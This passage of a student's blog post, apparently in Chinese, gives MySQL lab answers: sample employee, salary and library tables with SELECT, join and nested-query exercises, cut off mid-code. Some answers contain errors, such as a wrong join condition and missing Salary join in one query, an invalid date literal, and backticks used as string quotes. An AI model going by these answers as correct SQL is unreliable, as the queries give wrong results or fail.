class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">NO</span> <span class="keyword">ACTION</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">CASCADE</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of Employee</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'1001'</span>, <span class="string">'李勇'</span>, <span class="string">'1978-03-12 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南岳阳'</span>, <span class="string">'475001'</span>, <span class="string">'3880378'</span>, <span class="string">'ly@henu.edu.cn'</span>, <span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'1002'</span>, <span class="string">'王敏'</span>, <span class="string">'1980-11-02 00:00:00.000000'</span>, <span class="number">1</span>, <span class="string">'湖南衡阳'</span>, <span class="string">'475002'</span>, <span class="string">'378311'</span>, <span class="string">'wm@henu.edu.cn'</span>, <span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'1003'</span>, <span class="string">'刘晨'</span>, <span class="string">'1978-06-22 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南娄底'</span>, <span class="string">'475003'</span>, <span class="string">'378322'</span>, <span class="string">'lc@henu.edu.cn'</span>, <span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'2001'</span>, <span class="string">'张立'</span>, <span class="string">'1978-08-01 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南长沙'</span>, <span class="string">'475004'</span>, <span class="string">'378333'</span>, <span class="string">'zl@henu.edu.cn'</span>, <span class="string">'2'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'2002'</span>, <span class="string">'刘毅'</span>, <span class="string">'1982-01-23 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南岳阳'</span>, <span class="string">'475005'</span>, <span class="string">'378344'</span>, <span class="string">'ly@henu.edu.cn'</span>, <span class="string">'2'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'2003'</span>, <span class="string">'张玫'</span>, <span class="string">'1981-03-15 00:00:00.000000'</span>, <span class="number">1</span>, <span class="string">'湖南邵阳'</span>, <span class="string">'475006'</span>, <span class="string">'378355'</span>, <span class="string">'zm@henu.edu.cn'</span>, <span class="string">'2'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'3001'</span>, <span class="string">'徐静'</span>, <span class="string">'1976-08-12 00:00:00.000000'</span>, <span class="number">1</span>, <span class="string">'河南洛阳'</span>, <span class="string">'475007'</span>, <span class="string">'378366'</span>, <span class="string">'xj@henu.edu.cn'</span>, <span class="string">'3'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Employee`</span> <span class="keyword">VALUES</span> (<span class="string">'3002'</span>, <span class="string">'赵军'</span>, <span class="string">'1979-02-19 00:00:00.000000'</span>, <span class="number">0</span>, <span class="string">'湖南岳阳'</span>, <span class="string">'475008'</span>, <span class="string">'378377'</span>, <span class="string">'zj@henu.edu.cn'</span>, <span class="string">'3'</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for Salary</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`Salary`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`Salary`</span> (</span><br><span class="line">  <span class="string">`EmployeeID`</span> <span class="built_in">char</span>(<span class="number">6</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工编号，外键'</span>,</span><br><span class="line">  <span class="string">`Income`</span> <span class="built_in">float</span>(<span class="number">8</span>,<span class="number">0</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'收入'</span>,</span><br><span class="line">  <span class="string">`OutCome`</span> <span class="built_in">float</span>(<span class="number">8</span>,<span class="number">0</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支出\n'</span>,</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`foreign_key2`</span> (<span class="string">`EmployeeID`</span>),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> <span class="string">`foreign_key2`</span> FOREIGN <span class="keyword">KEY</span> (<span class="string">`EmployeeID`</span>) <span class="keyword">REFERENCES</span> <span class="string">`Employee`</span> (<span class="string">`EmployeeID`</span>) <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">NO</span> <span class="keyword">ACTION</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">CASCADE</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of Salary</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'1001'</span>, <span class="number">3600</span>, <span class="number">1500</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'1002'</span>, <span class="number">3300</span>, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'1003'</span>, <span class="number">3700</span>, <span class="number">1200</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'2001'</span>, <span class="number">4000</span>, <span class="number">1600</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'2002'</span>, <span class="number">3800</span>, <span class="number">1800</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'2003'</span>, <span class="number">3800</span>, <span class="number">1500</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'3001'</span>, <span class="number">4200</span>, <span class="number">2000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Salary`</span> <span class="keyword">VALUES</span> (<span class="string">'3002'</span>, <span class="number">4100</span>, <span class="number">1800</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><h3 id="3-练习下面简单的查询语句："><a href="#3-练习下面简单的查询语句：" class="headerlink" title="3. 练习下面简单的查询语句："></a>3. 练习下面简单的查询语句：</h3><p>1) 查询每个雇员的所有信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Employee;</span><br></pre></td></tr></table></figure><p>2) 查询每个雇员的地址和电话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">Name</span>, Address, PhoneNumber <span class="keyword">from</span> Employee;</span><br></pre></td></tr></table></figure><p>3) 查询EmployeeID为1001的雇员的地址和电话。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Address, PhoneNumber <span class="keyword">from</span> Employee <span class="keyword">where</span> EmployeeID <span class="keyword">like</span> <span class="string">'1001'</span>;</span><br></pre></td></tr></table></figure><p>4) 查询女雇员地址和电话，并将结果中各列的标题分别指定为“地址”和“电话”。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Address <span class="keyword">as</span> <span class="string">'地址'</span> , PhoneNumber <span class="keyword">as</span> <span class="string">'电话'</span> <span class="keyword">from</span> Employee <span class="keyword">where</span> Sex <span class="keyword">like</span> <span class="string">'1'</span>;</span><br></pre></td></tr></table></figure><p>5) 计算每个雇员的实际收入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Salary.Income-Salary.Outcome <span class="keyword">as</span> <span class="string">'工资'</span> <span class="keyword">from</span> Employee,Salary <span class="keyword">where</span> Employee.EmployeeID=Salary.EmployeeID;</span><br></pre></td></tr></table></figure><p>6) 找出所有姓王的雇员的部门号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> DepartmentID <span class="keyword">from</span> Employee <span class="keyword">where</span> <span class="keyword">Name</span> <span class="keyword">like</span> <span class="string">'王%'</span>;</span><br></pre></td></tr></table></figure><p>7) 找出所有地址中含有“阳”的雇员的号码和部门号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> PhoneNumber, DepartmentID <span class="keyword">from</span> Employee <span class="keyword">where</span> Address <span class="keyword">like</span> <span class="string">'%阳%'</span>;</span><br></pre></td></tr></table></figure><h3 id="4-练习多表连接查询和嵌套查询："><a href="#4-练习多表连接查询和嵌套查询：" class="headerlink" title="4. 练习多表连接查询和嵌套查询："></a>4. 练习多表连接查询和嵌套查询：</h3><p>1)查询每个雇员的情况及工资情况（工资=Income - Outcome)。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Employee.*, Salary.Income-Salary.Outcome <span class="keyword">as</span> <span class="string">'工资'</span> <span class="keyword">from</span> Employee,Salary <span class="keyword">where</span> Employee.EmployeeID=Salary.EmployeeID;</span><br></pre></td></tr></table></figure><p>2)查询财务部工资在2200元以上的雇员姓名及工资情况。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Employee.Name,Salary.Income-Salary.Outcome <span class="keyword">as</span> <span class="string">'工资'</span> <span class="keyword">from</span> Employee,Departments,Salary <span class="keyword">where</span> Employee.DepartmentID = Departments.DepartmentID </span><br><span class="line"><span class="keyword">and</span> Departments.DepartmentName=<span class="string">'财务部'</span> <span class="keyword">and</span> Salary.EmployeeID=Employee.EmployeeID <span class="keyword">and</span> Salary.Income-Salary.Outcome&gt;<span class="number">2200</span>;</span><br></pre></td></tr></table></figure><p>3)查询研发部在1966年以前出生的雇员姓名及其工资详情(工资详情包括收入、支出、工资)。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Employee.Name,Salary.income,Salary.Outcome, Salary.Income-Salary.Outcome <span class="keyword">as</span> <span class="string">'工资'</span> <span class="keyword">from</span> Employee,Departments,Salary <span class="keyword">where</span> Employee.Birthday &lt; <span class="string">'1966-00-00'</span> <span class="keyword">and</span> Departments.DepartmentID = Employee.EmployeeID <span class="keyword">and</span> Departments.DepartmentName=<span class="string">'研发部'</span>;</span><br></pre></td></tr></table></figure><p>4)查询人力资源部雇员的最高和最低工资。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(Salary.Income-Salary.Outcome) <span class="keyword">as</span> <span class="string">'最高工资'</span>,<span class="keyword">MIN</span>(Salary.Income-Salary.Outcome) <span class="keyword">as</span> <span class="string">'最低工资'</span></span><br><span class="line"><span class="keyword">FROM</span> Salary,Employee,Departments</span><br><span class="line"><span class="keyword">WHERE</span> Salary.EmployeeID=Employee.EmployeeID <span class="keyword">AND</span></span><br><span class="line">Employee.DepartmentID=Departments.DepartmentID <span class="keyword">AND</span></span><br><span class="line">Departments.DepartmentName=<span class="string">'人力资源部'</span>;</span><br></pre></td></tr></table></figure><p>5)将各雇员的情况按工资由低到高排列。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Salary.Income-Salary.Outcome <span class="keyword">as</span> <span class="string">'工资'</span> <span class="keyword">from</span> Salary <span class="keyword">ORDER</span> <span class="keyword">BY</span> Salary.Income-Salary.Outcome <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure><p>6)求各部门的雇员数及对应的部门名称。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(Employee.EmployeeID) <span class="keyword">as</span> <span class="string">'雇员数'</span>,Departments.DepartmentName <span class="keyword">as</span> <span class="string">'部门'</span></span><br><span class="line"><span class="keyword">from</span> Departments,Employee</span><br><span class="line"><span class="keyword">WHERE</span> Employee.DepartmentID=Departments.DepartmentID</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Departments.DepartmentName;</span><br></pre></td></tr></table></figure><p>7)找出所有在财务部和人力资源部工作的雇员的编号。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> EmployeeID <span class="keyword">from</span> Employee <span class="keyword">where</span> DepartmentID <span class="keyword">in</span> (<span class="keyword">select</span> DepartmentID <span class="keyword">from</span> Departments <span class="keyword">where</span> DepartmentName = <span class="string">'财务部'</span> <span class="keyword">or</span> DepartmentName =<span class="string">'人力资源部'</span>);</span><br></pre></td></tr></table></figure><p>8)统计人力资源部工资在2500以上雇员的人数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">Count</span>(*) <span class="keyword">from</span> Salary <span class="keyword">where</span> Income - Outcome&gt;<span class="number">2500</span> <span class="keyword">and</span> EmployeeID <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> EmployeeID <span class="keyword">from</span> Employee <span class="keyword">where</span> DepartmentID <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> DepartmentID <span class="keyword">from</span> Departments <span class="keyword">where</span> DepartmentName = <span class="string">'人力资源部'</span>));</span><br></pre></td></tr></table></figure><p>9)求财务部雇员的总人数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">Count</span>(*) <span class="keyword">from</span> Employee <span class="keyword">where</span> DepartmentID <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> DepartmentID <span class="keyword">from</span> Departments <span class="keyword">where</span> DepartmentName = <span class="string">'财务部'</span>);</span><br></pre></td></tr></table></figure><p>10)求财务部雇员的平均工资。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">AVG</span>(Salary.Income-Salary.Outcome) <span class="keyword">from</span> Salary,Employee <span class="keyword">where</span> Salary.EmployeeID = Employee.EmployeeID <span class="keyword">and</span> Employee.DepartmentID <span class="keyword">in</span> (</span><br><span class="line"><span class="keyword">select</span> DepartmentID <span class="keyword">from</span> Departments <span class="keyword">where</span> DepartmentName = <span class="string">'财务部'</span>);</span><br></pre></td></tr></table></figure><p>11)查找比所有财务部的雇员工资都高的雇员的姓名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">Name</span> <span class="keyword">from</span> Employee,Departments,Salary <span class="keyword">where</span> Employee.EmployeeID = Salary.EmployeeID <span class="keyword">and</span> Salary.Income-Salary.Outcome &gt; ALL(</span><br><span class="line"><span class="keyword">select</span> Salary.Income-Salary.Outcome <span class="keyword">from</span> Salary,Departments,Employee <span class="keyword">where</span> Salary.EmployeeID = Employee.EmployeeID <span class="keyword">and</span> Employee.DepartmentID = Departments.DepartmentID</span><br><span class="line"><span class="keyword">and</span> Departments.DepartmentName = <span class="string">'财务部'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>12)查找财务部年龄不低于研发部所有雇员年龄的雇员的姓名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Employee.Name <span class="keyword">from</span> Employee,Departments <span class="keyword">where</span> Employee.DepartmentID = Departments.DepartmentID <span class="keyword">and</span> Departments.DepartmentName=<span class="string">'财务部'</span></span><br><span class="line"><span class="keyword">and</span> Employee.Birthday &lt;= ALL(<span class="keyword">select</span> Employee.Birthday <span class="keyword">from</span> Employee,Departments </span><br><span class="line"><span class="keyword">where</span> Employee.DepartmentID = Departments.DepartmentID <span class="keyword">and</span> Departments.DepartmentName = <span class="string">'研发部'</span>);</span><br></pre></td></tr></table></figure><p>13)查找在财务部工作的雇员的情况。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Employee <span class="keyword">where</span> DepartmentID <span class="keyword">in</span> (<span class="keyword">select</span> DepartmentID <span class="keyword">from</span> Departments <span class="keyword">where</span> DepartmentName = <span class="string">'财务部'</span>);</span><br></pre></td></tr></table></figure><h3 id="5-提高操作实验"><a href="#5-提高操作实验" class="headerlink" title="5. 提高操作实验"></a>5. 提高操作实验</h3><p>建立“图书_读者”数据库及如下3个表，并输入实验数据，用SQL语句实现如下五个查询：</p><p>1）查找这样的图书类别：要求类别中最高的图书定价不低于按类别分组的图书的平均定价的2 倍。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`类别`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">as</span> BOOK <span class="keyword">group</span> <span class="keyword">by</span> <span class="string">`类别`</span> <span class="keyword">having</span> <span class="keyword">MAX</span>(<span class="string">`定价`</span>) &gt;= all(<span class="keyword">select</span> BOOK.<span class="string">`定价`</span> </span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">avg</span>(<span class="string">`定价`</span>) * <span class="number">2</span> <span class="keyword">as</span> <span class="string">`定价`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="string">`类别`</span>)BOOK);</span><br></pre></td></tr></table></figure><p>2）求机械工业出版社出版的各类图书的平均定价，分别用GROUP BY 和GROUP BY ALL表示。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`类别`</span>, <span class="keyword">AVG</span>(<span class="string">`定价`</span>) <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">where</span> <span class="string">`出版社`</span> <span class="keyword">like</span> <span class="string">'机械工业出版社'</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="string">`类别`</span>;</span><br><span class="line"><span class="comment">--mysql不支持GROUP BY ALL</span></span><br></pre></td></tr></table></figure><p>3）列出计算机类图书的书号、名称及价格，最后求出册数和总价格。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`书号`</span>, <span class="string">`书名`</span>, <span class="string">`定价`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">where</span> <span class="string">`类别`</span> <span class="keyword">like</span> <span class="string">'计算机'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">Count</span>(*) <span class="keyword">as</span> <span class="string">`总数`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">where</span> <span class="string">`类别`</span> <span class="keyword">like</span> <span class="string">'计算机'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">Sum</span>(<span class="string">`定价`</span>) <span class="keyword">as</span> <span class="string">`价格总和`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">where</span> <span class="string">`类别`</span> <span class="keyword">like</span> <span class="string">'计算机'</span>;</span><br></pre></td></tr></table></figure><p>4）列出计算机类图书的书号、名称及价格，并求出各出版社这类书的总价格，最后求出全部册书和总价格。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`书号`</span>, <span class="string">`书名`</span>, <span class="string">`定价`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">where</span> <span class="string">`类别`</span> <span class="keyword">like</span> <span class="string">'计算机'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">`出版社`</span>, <span class="keyword">Sum</span>(<span class="string">`定价`</span>) <span class="keyword">as</span> <span class="string">`总价`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">where</span> <span class="string">`类别`</span> <span class="keyword">like</span> <span class="string">'计算机'</span>  <span class="keyword">group</span> <span class="keyword">by</span> <span class="string">`出版社`</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">Sum</span>(<span class="string">`定价`</span>) <span class="keyword">as</span> <span class="string">`总价`</span>, <span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="string">`总数`</span> <span class="keyword">from</span> <span class="string">`图书`</span>;</span><br></pre></td></tr></table></figure><p>5）查询计算机类和机械工业出版社出版的图书。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="string">`书名`</span> <span class="keyword">from</span> <span class="string">`图书`</span> <span class="keyword">where</span> <span class="string">`类别`</span> <span class="keyword">like</span> <span class="string">`计算机`</span> <span class="keyword">and</span> <span class="string">`出版社`</span> <span class="keyword">like</span> <span class="string">`机械工业出版社`</span>;</span><br></pre></td></tr></table></figure><p>表结构如下：</p><p>图书：</p><table><thead><tr><th>列名</th><th>类型</th><th>长度</th><th>是否可为空</th></tr></thead><tbody><tr><td>书号</td><td>char</td><td>10</td><td></td></tr><tr><td>类别</td><td>char</td><td>12</td><td>是</td></tr><tr><td>出版社</td><td>char</td><td>50</td><td></td></tr><tr><td>作者</td><td>char</td><td>20</td><td>是</td></tr><tr><td>书名</td><td>char</td><td>50</td><td></td></tr><tr><td>定价</td><td>money</td><td>8</td><td>是</td></tr></tbody></table><p>读者：</p><table><thead><tr><th>列名</th><th>类型</th><th>长度</th><th>是否可为空</th></tr></thead><tbody><tr><td>编号</td><td>char</td><td>10</td><td></td></tr><tr><td>姓名</td><td>char</td><td>8</td><td></td></tr><tr><td>单位</td><td>char</td><td>50</td><td>是</td></tr><tr><td>性别</td><td>char</td><td>2</td><td>是</td></tr><tr><td>电话</td><td>char</td><td>15</td><td>是</td></tr></tbody></table><p>借阅：</p><table><thead><tr><th>列名</th><th>类型</th><th>长度</th><th>是否可为空</th></tr></thead><tbody><tr><td>串号</td><td>char</td><td>10</td><td></td></tr><tr><td>书号</td><td>char</td><td>10</td><td></td></tr><tr><td>读者编号</td><td>char</td><td>10</td><td></td></tr><tr><td>借阅日期</td><td>datetime</td><td>8</td></tr></tbody></table><p><strong>要求：</strong></p><p>①图书表：书号为主码</p><p>②读者表：编号为主码；</p><p>③借阅表：串号为主码；</p><p>书号为外码，参照表、列是图书表的书号列；</p><p>读者编号为外码，参照表、列是读者表的编号列；</p><p><strong>实验数据：</strong></p><p>图书：</p><table><thead><tr><th>书号</th><th>类别</th><th>出版社</th><th>作者</th><th>书名</th><th>定价</th></tr></thead><tbody><tr><td>1001</td><td>计算机</td><td>机械工业出版社</td><td>王民</td><td>数据结构</td><td>80</td></tr><tr><td>1002</td><td>计算机</td><td>机械工业出版社</td><td>张建平</td><td>计算机应用</td><td>20</td></tr><tr><td>1003</td><td>计算机</td><td>电子工业出版社</td><td>王敏</td><td>数据库技术</td><td>15</td></tr><tr><td>1004</td><td>计算机</td><td>电子工业出版社</td><td>谭浩强</td><td>C 语言</td><td>25</td></tr><tr><td>1005</td><td>英语</td><td>中国人民大学出版社</td><td>张锦芯</td><td>应用文写作</td><td>25</td></tr><tr><td>1006</td><td>管理</td><td>高等教育出版社</td><td>Robison</td><td>管理学</td><td>15</td></tr><tr><td>1007</td><td>管理</td><td>机械工业出版社</td><td>Fayol</td><td>工业管理</td><td>70</td></tr><tr><td>1008</td><td>数学</td><td>机械工业出版社</td><td>李平</td><td>线性代数</td><td>50</td></tr><tr><td>1009</td><td>管理</td><td>机械工业出版社</td><td>Durark</td><td>公司的概念</td><td>14</td></tr><tr><td>1010</td><td>数学</td><td>机械工业出版社</td><td>徐新国</td><td>统计学</td><td>15</td></tr></tbody></table><p>读者：</p><table><thead><tr><th>编号</th><th>姓名</th><th>单位</th><th>性别</th><th>电话</th></tr></thead><tbody><tr><td>1001</td><td>丁一</td><td>数学院</td><td>男</td><td>81234567</td></tr><tr><td>1002</td><td>赵二</td><td>经济学院</td><td>男</td><td>82234567</td></tr><tr><td>1003</td><td>张三</td><td>管理学院</td><td>女</td><td>83234567</td></tr><tr><td>1004</td><td>李四</td><td>文学院</td><td>男</td><td>84234567</td></tr><tr><td>1005</td><td>王五</td><td>历史文化学院</td><td>女</td><td>85234567</td></tr><tr><td>1006</td><td>孙六</td><td>物理学院</td><td>男</td><td>86234567</td></tr><tr><td>1007</td><td>周七</td><td>生命科学院</td><td>女</td><td>87234567</td></tr><tr><td>1008</td><td>徐八</td><td>化学院</td><td>男</td><td>88234567</td></tr><tr><td>1009</td><td>宋九</td><td>信息学院</td><td>女</td><td>89234567</td></tr><tr><td>1010</td><td>刘十</td><td>计算机学院</td><td>女</td><td>80234567</td></tr></tbody></table><p>借阅：</p><table><thead><tr><th>串号</th><th>书号</th><th>读者编号</th><th>借阅日期</th></tr></thead><tbody><tr><td>01</td><td>1001</td><td>1003</td><td>2000-1-1</td></tr><tr><td>02</td><td>1002</td><td>1005</td><td>2002-3-5</td></tr><tr><td>03</td><td>1003</td><td>1008</td><td>1998-6-18</td></tr><tr><td>04</td><td>1004</td><td>1003</td><td>1997-12-8</td></tr><tr><td>05</td><td>1005</td><td>1010</td><td>2001-5-4</td></tr><tr><td>06</td><td>1006</td><td>1001</td><td>2005-7-25</td></tr><tr><td>07</td><td>1007</td><td>1010</td><td>1997-11-3</td></tr><tr><td>08</td><td>1008</td><td>1009</td><td>2004-2-1</td></tr><tr><td>09</td><td>1009</td><td>1004</td><td>1996-9-1</td></tr><tr><td>10</td><td>1010</td><td>1008</td><td>2000-6-4</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 